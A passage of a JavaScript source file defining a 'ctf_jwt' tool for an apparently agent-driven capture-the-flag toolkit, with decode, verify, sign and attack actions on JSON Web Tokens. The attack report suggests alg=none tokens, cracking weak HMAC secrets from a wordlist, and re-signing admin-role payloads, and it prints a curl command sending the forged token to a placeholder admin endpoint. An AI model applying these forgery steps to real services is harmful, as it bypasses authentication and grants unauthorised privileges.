        } catch {
          return '<用命中的密钥重签一个提权 token>'
        }
      })()
    : '<alg=none 变体或重签后的 token>'
  lines.push('```bash')
  lines.push(`TOKEN='${forged}'`)
  lines.push('curl -s -H "Authorization: Bearer $TOKEN" http://target/api/admin')
  lines.push('```')
  lines.push('')
  lines.push('## 下一步')
  lines.push('- 用命中的密钥重签一个高权限 payload（含目标 `sub`/`role`/`admin`），替换 cookie 或 Authorization 头。')
  lines.push('- 若字典未命中，把目标站点的常见默认密钥（项目名、域名、`flag`）加进 `wordlist` 再跑。')
  return lines.join('\n')
}

// ---------------------------------------------------------------------------
// 工具定义
// ---------------------------------------------------------------------------

/**
 * 构造 `ctf_jwt` 工具定义。
 * @param {any} ctx registrant context
 */
export function createJwtTool(ctx) {
  void ctx
  return {
    name: 'ctf_jwt',
    description: JWT_DESCRIPTION,
    parameters: {
      type: 'object',
      additionalProperties: false,
      properties: {
        action: {
          type: 'string',
          enum: JWT_ACTIONS,
          description: 'decode (default) | verify | sign | attack.',
        },
        token: {
          type: 'string',
          description: 'The JWT itself. Required by decode, verify and attack.',
        },
        secret: {
          type: 'string',
          description: 'HMAC secret used by verify and sign.',
        },
        algorithm: {
          type: 'string',
          enum: JWT_ALGORITHMS,
          description: 'Algorithm for sign (default HS256); for verify it only drives the mismatch warning, the header.alg is authoritative.',
        },
        payload: {
          type: 'string',
          description: 'JSON string used as the payload by sign, e.g. {"sub":"admin","role":"admin"}.',
        },
        wordlist: {
          type: 'array',
          items: { type: 'string' },
          description: 'Extra secret candidates appended to the built-in weak-secret dictionary for attack.',
        },
      },
    },
    output: textOutput('JWT'),
    async execute(args) {
      try {
        const input = args !== null && typeof args === 'object' ? args : {}
        const action = normalizeAction(input.action)
        if (action === null) {
          return { text: jwtErrorReport(`不支持的 action：${JSON.stringify(input.action)}；可选 ${JWT_ACTIONS.join(' / ')}。`) }
        }
        if (action === 'decode') {
          if (typeof input.token !== 'string' || input.token.trim().length === 0) {
            return { text: jwtErrorReport('decode 需要 token 参数。') }
          }
          return { text: renderDecodeReport(input.token.trim()) }
        }
        if (action === 'verify') {
          if (typeof input.token !== 'string' || input.token.trim().length === 0) {
            return { text: jwtErrorReport('verify 需要 token 参数。') }
          }
          if (typeof input.secret !== 'string') {
            return { text: jwtErrorReport('verify 需要 secret 参数（字符串）。') }
          }
          const requested = typeof input.algorithm === 'string' && JWT_ALGORITHMS.includes(input.algorithm)
            ? input.algorithm
            : ''
          return { text: renderVerifyReport(input.token.trim(), input.secret, requested) }
        }
        if (action === 'sign') {
          if (typeof input.payload !== 'string' || input.payload.trim().length === 0) {
            return { text: jwtErrorReport('sign 需要 payload 参数：一个 JSON 字符串，例如 {"sub":"admin"}。') }
          }
          const algorithm = normalizeAlgorithm(input.algorithm)
          if (algorithm !== 'none' && typeof input.secret !== 'string') {
            return { text: jwtErrorReport(`${algorithm} 签名需要 secret 参数。`) }
          }
          return { text: renderSignReport(input.payload, typeof input.secret === 'string' ? input.secret : '', algorithm) }
        }
        if (typeof input.token !== 'string' || input.token.trim().length === 0) {
          return { text: jwtErrorReport('attack 需要 token 参数。') }
        }
        const wordlist = Array.isArray(input.wordlist) ? input.wordlist : []
        return { text: renderAttackReport(input.token.trim(), wordlist) }
      } catch (error) {
        return { text: jwtErrorReport(`执行失败：${error?.message ?? String(error)}`) }
      }
    },
  }
}
